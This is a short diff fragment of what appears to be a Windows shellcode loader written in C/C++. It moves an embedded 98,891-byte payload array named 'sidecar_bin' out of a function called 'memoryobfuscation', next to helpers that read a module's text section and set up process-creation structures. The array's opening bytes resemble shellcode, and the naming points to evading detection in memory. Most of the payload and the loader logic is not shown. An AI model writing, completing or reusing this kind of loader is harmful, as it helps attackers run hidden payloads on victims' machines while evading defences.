@@ -25,8 +25,6 @@ TextSectionInfo GetTextSectionInfo(HMODULE hModule) {
     return info;
 }
 
-void memoryobfuscation(){
-
     unsigned char sidecar_bin[] = {
   0xe8, 0xc0, 0x1f, 0x01, 0x00, 0xc0, 0x1f, 0x01, 0x00, 0xb9, 0x3d, 0xee,
   0x2c, 0x27, 0x6c, 0x6a, 0x53, 0xa4, 0x6c, 0xcc, 0x63, 0x64, 0xaf, 0xeb,
@@ -8272,6 +8270,7 @@ void memoryobfuscation(){
 };
 unsigned int sidecar_bin_len = 98891;
 
+void memoryobfuscation(){
   
     STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
